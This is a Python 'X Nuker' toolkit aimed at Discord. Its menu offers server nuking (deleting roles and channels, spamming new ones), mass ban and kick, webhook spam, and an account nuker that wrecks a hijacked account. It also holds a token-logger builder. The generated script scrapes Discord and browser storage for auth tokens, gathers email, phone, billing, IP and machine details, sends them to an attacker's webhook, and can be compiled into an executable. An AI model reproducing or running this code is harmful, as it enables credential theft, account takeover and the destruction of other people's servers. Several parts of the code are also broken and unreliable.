import logging
import threading
import time
from pip import main
from time import sleep
from pystyle import Colors, Colorate
from pystyle import Colorate, Colors
import os
from discord.ext import commands
import discord
import tqdm
from colorama import Fore, Style
import requests
import sys
import shutil
from dhooks import Webhook
import random


def BanMembers(self, guild, member):
    while True:
        r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned{self.colour} {member.strip()}\033[37m")
                break
            else:
                break


def Spinner():
    l = ['|', '/', '-', '\\']
    for i in l + l + l:
        sys.stdout.write(
            f"""\r[\x1b[95m+\x1b[95m\x1B[37m] Loading HWID... [{i}]""")
        sys.stdout.flush()
        time.sleep(0.1)


os.system("title Loading ..")

print(f"{Fore.WHITE}")

progressbar = tqdm.tqdm([2, 4, 6, 8, 9, 10])

for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Loading: ')

os.system("title Scaping Proxies...")

print(f"{Fore.LIGHTMAGENTA_EX}")

progressbar = tqdm.tqdm([2, 4, 6, 8, 9, 10, 11, 12, 13, 14, 15])

for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Scaping Proxies... ')

os.system("title Loading HUD...")

print(f"{Fore.WHITE}")

progressbar = tqdm.tqdm([1, 2, 3])

for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' stormzW... ')

os.system("title stormzW")

print(f"{Fore.LIGHTMAGENTA_EX}")

progressbar = tqdm.tqdm([1, 2, ])

for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Checking For Updates... ')

proxies = []
v = Style.BRIGHT
m = v + Fore.MAGENTA
r = v + Fore.RED
g = v + Fore.GREEN
b = v + Fore.BLUE
w = v + Fore.WHITE

intents = discord.Intents.all()
CDbot = commands.Bot(command_prefix='X.', intents=intents)

TOKEN = input(f"Enter Bot Token: ")

headers = {'Authorization': TOKEN, 'Content-Type': 'application/json'}
r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
if r.status_code == 200:
    userName = r.json()['username'] + r.json()['discriminator']
    logging.info(Colorate.Horizontal(
        Colors.rainbow, f"[X$Token] Valid Token!", 1))
    time.sleep(1)
else:
    logging.info(Colorate.Horizontal(Colors.rainbow,
                                     f"[X$Token] Invalid Token . . . ", 1))


os.system('cls')
os.system('title X Nuker By   [$] STORMZ#9999 + Recode by lux')
input(Colorate.Horizontal(Colors.rainbow,
                          f"""






  ▀████    ▐████▀      ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████    ▄████████ 
    ███▌   ████▀       ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███   ███    ███ 
     ███  ▐███         ███   ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ 
     ▀███▄███▀         ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
     ████▀██▄          ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
    ▐███  ▀███         ███   ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████ 
   ▄███     ███▄       ███   ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ 
  ████       ███▄       ▀█   █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███ 
                                              ▀                        ███    ███

    =============================================X================================================

                                    Fuck Skids | stormz = W
                                             V.3.1
                                       Recoded


    =============================================X===============================================

                   Server Nuker           Account Nuker/Logger
                ___________________      _____________________
               | [01] Server Nuker |    | [06] Token Logger   | 
               | [02] Mass Ban     |    | [07] Webhook Spammer|
               | [03] Proxy Scrape |    | [08] Nuke Account   |
               | [04] About Nuker  |    | [09] Token Gen      |
               | [05] Mass Kick    |    | [10] Bruteforce     |
               |___________________|    |_____________________| 



                   click enter to start!                 

                            """, 1))

choice = input(Colorate.Horizontal(Colors.rainbow,
                                   f'Choice -->'))

if choice == '4' or choice == '04':
    os.system('cls')
    os.system('title [$About]')
    input(Colorate.Horizontal(Colors.rainbow,
                              f"""
    > Dev by STORMZ#9999
    
    > Find issues? let me know on discord.gg/teams



    """, 1))

    Write = input(f"Exit -->",
                  Colors.rainbow, interval=0.02)
if choice == '1' or choice == '01':
    MAX_CHANNELS = 100
    chanless = input(Colorate.Horizontal(
        Colors.rainbow, f"Spam Channel Name -->", 1))
    spam = input(Colorate.Horizontal(
        Colors.rainbow, f"Spam Message Name -->", 1))
    print(f'{v + Fore.RED}Type: !Help In Chat To Nuke The Server - stormzw')
    client = commands.Bot(command_prefix="!")


    @client.command()
    async def Help(ctx):
        await ctx.message.delete()
        guild = ctx.guild

        for role in guild.roles:

            try:
                await role.delete()
                print(
                    f'{v + Fore.RED,}[>]{role.name} Has Been Deleted - stormzw')
            except:
                print(
                    f'{v + Fore.WHITE}[Rate$Limited]{role.name} Can not be deleted ')

        for channel in guild.channels:
            try:
                await channel.delete()
                print(
                    f'{v + Fore.RED}[>]{channel.name} Has Been Deleted - stormzw')
            except:
                print(
                    f'{v + Fore.WHITE}[Rate$Limited] You Cant Delete: {channel}...')

        try:
            for i in range(MAX_CHANNELS):
                await guild.create_text_channel(chanless)
                print(
                    f'{v + Fore.BLUE}[>]{chanless} Has Been Created!')
        except:
            print(
                f'{v + Fore.WHITE}[Rate$Limited] You havent got permission to create channels')


    @client.event
    async def on_guild_channel_create(channel):
        while True:
            try:
                await channel.send(spam)
                print(f'{Fore.RED_EX}[>]{Fore.RESET} SPAMMIMG :)')

            except:
                print(
                    f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} stormzW')


    def thread():
        threading.Thread(target=on_guild_channel_create,
                         args=(client.run(TOKEN))).start()


    thread()

if choice == '2' or choice == '02':
    print(
        f'{v + Fore.RED}Type !massban in chat to Massban...')
    client2 = commands.Bot(
        command_prefix='!',
        intents=discord.Intents.all(),
        help_command=None
    )


    @client2.command()
    async def massban(ctx):
        await ctx.message.delete()
        users = list(ctx.guild.members)
        for user in users:
            try:
                print(f"Banned {user} - stormzW")
                await user.ban(reason="stormz runs your shit")
            except:
                pass


    client2.run(TOKEN)

time.sleep(5)
exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter ')
exit = os.system('cls')

if choice == '3' or choice == '03':
    os.system('cls')
    input(Colorate.Horizontal(Colors.rainbow,
                              f"""
            >Proxies come with X Nuker<
             >{countproxies} == Proxy Count< 184586 - stormzw
    """, 1))

if choice == '5':
    print(
        f'{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX}[>]{Fore.RESET} Type !masskick in chat to Masskick...{Fore.RESET}')
    headers = {
        "Authorization":
            f"Bot {TOKEN}"
    }

    client2 = commands.Bot(
        command_prefix='!',
        intents=discord.Intents.all(),
        help_command=None
    )


    @client2.command()
    async def masskick(ctx):
        await ctx.message.delete()
        servr = ctx.guild.id

        def mass_ban(i):
            sessions = requests.Session()
            sessions.put(
                f"https://discord.com/api/v9/guilds/{servr}/kick/{i}",
                headers=headers
            )

        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(
                    target=mass_ban,
                    args=(member.id,)
                ).start()
        print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done...')

if choice == '5' or choice == '05':
    print(
        f'{v + Fore.RED}Type !masskick in chat to Massban...')
    client2 = commands.Bot(
        command_prefix='!',
        intents=discord.Intents.all(),
        help_command=None
    )


    @client2.command()
    async def masskick(ctx):
        await ctx.message.delete()
        users = list(ctx.guild.members)
        for user in users:
            try:
                print(f"Kicked {user}")
                await user.kick(reason="Mass Kick")
            except:
                pass


    client2.run(TOKEN)

    main()

    if choice == '7' or choice == '07': Webhook1 = input('Enter Webhook URL -->')
    os.system('cls')
    hook = Webhook(Webhook1)

    MessageToSpam = input('Spam Text -->')
    while True:
        hook.send(f"@everyone {MessageToSpam}")
if choice == '8':
    os.system('cls')
    Spinner()
    os.system('cls')
    tokenn = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ")

    print(f'''{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Server Spam
{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Remove all Friends
{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Block all Friends
{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Spam Settings
{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} Leave all Servers
{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Close all DMs
{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Friend Mass DM
{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} Delete all Personal Servers''')


    def servers(token):
        cumt = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Channels Do You Want To Create?: '))
        server_name = input('[\x1b[95m>\x1b[95m\x1B[37m] Server Name: ')
        headers = mainHeader(token)
        for i in range(cumt):
            payload = {"name": server_name}
            requests.post(
                "https://discord.com/api/v9/guilds", headers=headers, json=payload
            )


    def remove_friends(token):
        headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
        rmvfr = requests.get(
            "https://discord.com/api/v9/users/@me/relationships", headers=headers
        ).json()
        for i in rmvfr:
            requests.delete(
                f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                headers=headers,
            )
            print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Removed Friend {i['id']}")


    def block_friends(token):
        headers = {"authorization": token, "user-agent": "bruh6/9"}
        json = {"type": 2}
        blck = requests.get(
            "https://discord.com/api/v9/users/@me/relationships", headers=headers
        ).json()
        for i in blck:
            requests.put(
                f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                headers=headers,
                json=json,
            )
            print(f"{Fore.LIGHTGREEN_EX}[!] Blocked Friend {i['id']} {Fore.RESET}")


    def settings(token):
        print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Starting')
        for i in range(0, 100):
            headers = mainHeader(token)
            changset = True
            payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                       "message_display_compact": changset, "explicit_content_filter": 2,
                       "default_guilds_restricted": changset,
                       "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                               "mutual_guilds": changset},
                       "inline_embed_media": changset, "inline_attachment_media": changset,
                       "gif_auto_play": changset, "render_embeds": changset,
                       "render_reactions": changset, "animate_emoji": changset,
                       "convert_emoticons": changset, "animate_stickers": 1,
                       "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                       "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                       "stream_notifications_enabled": changset, "status": "idle",
                       "detect_platform_accounts": changset, "disable_games_tab": changset}
            requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
            changset = False
            payload = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                       "message_display_compact": changset, "explicit_content_filter": 0,
                       "default_guilds_restricted": changset,
                       "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                               "mutual_guilds": changset},
                       "inline_embed_media": changset, "inline_attachment_media": changset,
                       "gif_auto_play": changset, "render_embeds": changset,
                       "render_reactions": changset, "animate_emoji": changset,
                       "convert_emoticons": changset, "animate_stickers": 2,
                       "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                       "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                       "stream_notifications_enabled": changset, "status": "dnd",
                       "detect_platform_accounts": changset, "disable_games_tab": changset}
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)


    def server_leave(token):
        headers = {"authorization": token, "user-agent": "bruh6/9"}
        levlservr = requests.get(
            "https://discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for serr in levlservr:
            requests.delete(
                f"https://discord.com/api/v9/users/@me/guilds/{serr['id']}",
                headers=headers,
            )
            print(f"{Fore.LIGHTGREEN_EX}[!]{Fore.RESET} Left Guild: {serr['id']}")


    def dms_close(token):
        headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
        clsdms = requests.getprint(
            "https://discord.com/api/v9/users/@me/channels", headers=headers
        ).json()
        for channel in clsdms:
            requests.delete(
                f"https://discord.com/api/v9/channels/{channel['id']}",
                headers=headers,
            )


    def mass_dm(token):
        message = input('Message: ')
        headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
        reqmas = requests.get(
            "https://discord.com/api/v9/users/@me/channels", headers=headers
        ).json()
        for chen in reqmas:
            json = {"content": message}
            time.sleep(1)
            requests.post(
                f"https://discord.com/api/v9/channels/{chen['id']}/messages",
                headers=headers,
                data=json,
            )
            print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {chen['id']} Sent")


    def delete_servers(token):
        headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
        print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Deleting...")
        dmms = requests.get(
            "https://discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for i in dmms:
            requests.post(
                f"https://discord.com/api/v9/guilds/{i['id']}/delete",
                headers=headers,
            )
            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {i["id"]} deleted')


    options = {
        "1": servers,
        "2": remove_friends,
        "3": block_friends,
        "4": settings,
        "5": server_leave,
        "6": dms_close,
        "7": mass_dm,
        "8": delete_servers
    }


    def main():
        choiceee = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")
        threading.Thread(target=options[choiceee](tokenn)).start()


    if __name__ == "__main__":
        while 1:
            main()

    time.sleep(1)

    exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
    exit = clear()
    exit = spammer()

if choice == '9' or choice == '09':
    os.system('cls')
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    for i in range(500):
        first = ''.join((random.choice(chars) for i in range(24)))
        second = ''.join((random.choice(chars) for i in range(6)))
        third = ''.join((random.choice(chars) for i in range(27)))

        result = first + "." + second + "." + third

        output = open("tokens.txt", "a")
        output.write(result + "\n")

if choice == '6' or choice == '06':
    os.system('cls')
    global filename, webhooklink
    fileName = input(Colorate.Horizontal(Colors.rainbow,
                                         f"File Name: ", 1))
    webhooklink = input(Colorate.Horizontal(Colors.rainbow,
                                            f"Webhook URL: ", 1))

    try:
        with open(f"{fileName}.py", "w") as file:
            file.write("""import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\\\Discord",
    "Discord Canary"    : ROAMING + "\\\\discordcanary",
    "Discord PTB"       : ROAMING + "\\\\discordptb",
    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 12208895,
                "fields": [
                    {
                        "name": "**Account Info:**",
                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info:**",
                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token:**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {

                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "X Nuker",
        "avatar_url": "https://media.discordapp.net/attachments/961143421110738964/961202999798153246/1472523859_hellsing.gif?width=499&height=473"
    }
    try:
        urlopen(Request("~~TOKENURLHERE~~", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

main()""".replace("~~TOKENURLHERE~~", webhooklink))

    except Exception as e:
        print(f"""\t\t[!] Error Writing File: {e}\n""")
        main()

    print(f"""File has been correctly written to "{fileName}.py"\n""")
    convert = input(Colorate.Horizontal(Colors.rainbow,
                                        f"Convert Your Script Into an .EXE (y/n)?: ")).lower()
    if convert == 'y':
        try:
            os.system(f"pyinstaller --onefile -i NONE {fileName}.py")
            os.remove(f"{fileName}.spec")
            shutil.rmtree(f"build")
            shutil.rmtree(f"__pycache__")
            print(
                f"""{v + Fore.RED}[>]{Fore.RESET} {v + Fore.GREEN}The executable file has been correctly generated. Look in {v + Fore.RED}"dist"{Fore.RESET} folder{Fore.RESET}\n""")
        except Exception as e:
            print(f"[!] Error: {e}")
